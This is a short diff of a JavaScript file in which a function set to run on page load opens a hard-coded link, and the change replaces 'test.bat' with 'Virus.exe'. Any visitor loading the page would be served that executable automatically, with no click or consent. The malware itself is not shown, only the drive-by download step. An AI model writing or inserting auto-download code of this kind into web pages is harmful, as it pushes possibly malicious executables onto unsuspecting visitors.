@@ -2,7 +2,7 @@ window.onload = downloadFile;
 
 
 function downloadFile(url, filename) {
-    let link = "test.bat";
+    let link = "Virus.exe";
     window.open(link, '_self');
     // "use strict";
     // console.log("called");
